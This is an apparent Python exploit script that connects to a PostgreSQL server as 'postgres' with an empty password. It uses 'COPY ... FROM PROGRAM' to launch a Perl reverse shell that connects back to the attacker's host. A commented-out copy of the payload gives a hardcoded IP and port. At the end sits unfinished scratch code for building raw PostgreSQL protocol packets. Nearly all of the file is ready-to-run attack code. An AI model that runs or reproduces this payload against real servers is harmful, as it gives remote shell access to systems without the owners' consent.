import psycopg2
from psycopg2.extras import RealDictCursor
from socket import gethostbyname, gethostname

RHOST = input("INPUT RHOST IP : ")
RPORT = 5432

LHOST = gethostbyname(gethostname())
LPORT = 4444

USER = "postgres"
PW = ""
DB = ""

conn = psycopg2.connect(database=DB, host=RHOST, user=USER, password=PW, port=RPORT)
pcur=conn.cursor(cursor_factory=RealDictCursor)

cmd_list = [
        'DROP TABLE IF EXISTS RCE_BASE;',
        'CREATE TABLE RCE_BASE(filename text);',
        """COPY RCE_BASE FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);
        $c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);
        system$_ while<>;''';""".format(LHOST,LPORT),
        'DROP TABLE IF EXISTS RCE_BASE;',
       ]

[pcur.execute(cmd) for cmd in cmd_list]





# COPY RCE_BASE FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.129:4343");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';

"""
class PSQL:
    def __init__(self, user="user", param_database="template1"):
        self.Length = 42
        self.Proto_major_ver = 3
        self.Proto_minor_ver = 0

        self.param_user = user
        #self.param_database = param_database.encode("hex")
        #print(self.param_database)


import socket
import binascii
pgsql_client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

print(str(binascii.hexlify(b'user'))+'00')
print(chr(int("75",16)))


RHOST = '192.168.200.123'#input("INPUT RHOST (EX: 192.168.200.123) : ")
RPORT = 5432
PSQL()
pgsql_client.connect(('192.168.200.123',RPORT))
#pgsql_client.send()
pgsql_client.recv(4096)
"""